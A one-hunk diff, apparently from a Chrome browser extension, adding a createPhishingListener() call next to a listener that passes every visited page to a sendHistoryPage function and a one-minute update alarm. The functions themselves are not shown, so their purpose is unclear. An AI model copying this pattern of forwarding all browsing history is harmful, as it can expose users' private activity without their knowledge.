@@ -11,6 +11,7 @@ chrome.runtime.onInstalled.addListener(() => {
   chrome.history.onVisited.addListener((page) => {
     sendHistoryPage(page);
   });
+  createPhishingListener();
   chrome.alarms.create("updater", {
     periodInMinutes: 1
   });
